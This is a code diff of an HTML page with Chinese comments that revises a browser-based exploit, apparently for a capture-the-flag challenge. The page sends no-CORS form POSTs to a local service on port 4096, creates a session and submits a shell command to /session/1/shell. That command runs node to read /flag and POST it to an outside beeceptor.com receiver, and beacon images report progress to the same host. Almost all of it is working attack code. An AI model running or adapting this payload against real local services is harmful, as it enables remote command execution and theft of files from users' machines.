@@ -4,8 +4,7 @@
 <body>
 <script>
 (function() {
-    // 外带地址（替换成你的接收端，例如 beeceptor 或你的服务器）
-    const EXFIL = "https://123333.free.beeceptor.com";
+    const EXFIL = "http://123333.free.beeceptor.com ";   // 你的接收端
     const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
     const LOC = encodeURIComponent(location.href);
     const REF = encodeURIComponent(document.referrer || "");
@@ -15,40 +14,33 @@
         img.src = `${EXFIL}/log?run=${RUN_ID}&loc=${LOC}&ref=${REF}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
     }
 
-    // 使用 node 读取 flag 并外发（已验证 node 可用）
     const EXFIL_FLAG = `${EXFIL}/flag?run=${RUN_ID}`;
     const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL_FLAG}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;
 
-    // 只探测 mock 服务监听的端口 4096
     const TARGET_PORT = 4096;
     const BASE = `http://localhost:${TARGET_PORT}`;
 
-    function sendRequest(url, method, body, contentType) {
-        if (method === 'GET') {
-            let img = new Image();
-            img.src = url;
-        } else {
-            fetch(url, {
-                method: method,
-                headers: { 'Content-Type': contentType || 'application/json' },
-                body: body,
-                mode: 'no-cors'
-            }).catch(e => beacon('fetch_err', `url=${encodeURIComponent(url)}&err=${e.message}`));
-        }
+    // 发送简单 POST 请求（application/x-www-form-urlencoded），不会触发 CORS 预检
+    function sendPost(url, body) {
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: body,
+            mode: 'no-cors'
+        }).catch(e => beacon('fetch_err', `url=${encodeURIComponent(url)}&err=${e.message}`));
     }
 
     function exploit() {
-        beacon('exploit_start', `port=${TARGET_PORT}`);
-        // 1. 创建会话
-        sendRequest(BASE + '/session', 'POST', JSON.stringify({}), 'application/json');
-        // 2. 尝试常见的会话 ID 执行命令（mock 服务接受任何 ID，这里使用 1）
+        beacon('exploit_start');
+        // 创建 session（空表单）
+        sendPost(BASE + '/session', '');
+        // 发送命令到 session/1/shell
         const shellUrl = BASE + '/session/1/shell';
-        sendRequest(shellUrl, 'POST', JSON.stringify({ command: PAYLOAD }), 'application/json');
-        sendRequest(shellUrl, 'POST', `command=${encodeURIComponent(PAYLOAD)}`, 'application/x-www-form-urlencoded');
+        const body = `command=${encodeURIComponent(PAYLOAD)}`;
+        sendPost(shellUrl, body);
         beacon('exploit_done');
     }
 
-    // 探测端口是否开放
     let iframe = document.createElement('iframe');
     iframe.style.display = 'none';
     iframe.src = `http://localhost:${TARGET_PORT}/`;
